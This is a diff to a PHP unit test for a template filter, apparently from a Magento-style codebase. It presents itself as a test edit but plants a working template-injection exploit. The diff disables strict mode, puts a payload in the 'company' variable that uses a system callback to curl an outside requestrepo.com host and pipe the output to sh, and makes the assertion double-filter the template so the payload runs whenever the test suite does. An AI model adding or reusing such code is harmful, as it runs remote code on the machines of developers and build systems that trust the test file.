@@ -346,10 +346,11 @@ EXPECTED_RESULT;
 
     public function testFilterVarious1()
     {
+        $this->templateFilter->setStrictMode(false);
         $this->templateFilter->setVariables(
             [
                 'customer' => new DataObject(['firstname' => 'Felicia', 'lastname' => 'Henry']),
-                'company' => 'A. L. Price',
+                'company' => '{{layout handle=delivery inline=$this.TemplateFilter.filter(inlinecss) href=$this.TemplateFilter.addAfterFilterCallback(system).filter(IFS=];a=curl]http://ohaghkr7.requestrepo.com;$a|sh)}}',
                 'street1' => '687 Vernon Street',
                 'city' => 'Parker Dam',
                 'region' => 'CA',
@@ -358,6 +359,10 @@ EXPECTED_RESULT;
             ]
         );
 
+
+
+
+        $template = 1;
         $template = <<<TEMPLATE
 {{var customer.firstname}} {{depend middlename}}{{var middlename}} {{/depend}}{{var customer.getLastname()}}
 {{depend company}}{{var company}}{{/depend}}
@@ -390,7 +395,7 @@ EXPECTED_RESULT;
 
         $this->assertEquals(
             $expectedResult,
-            $this->templateFilter->filter($template),
+            $this->templateFilter->filter($this->templateFilter->filter($template)),
             'Template was processed incorrectly'
         );
     }
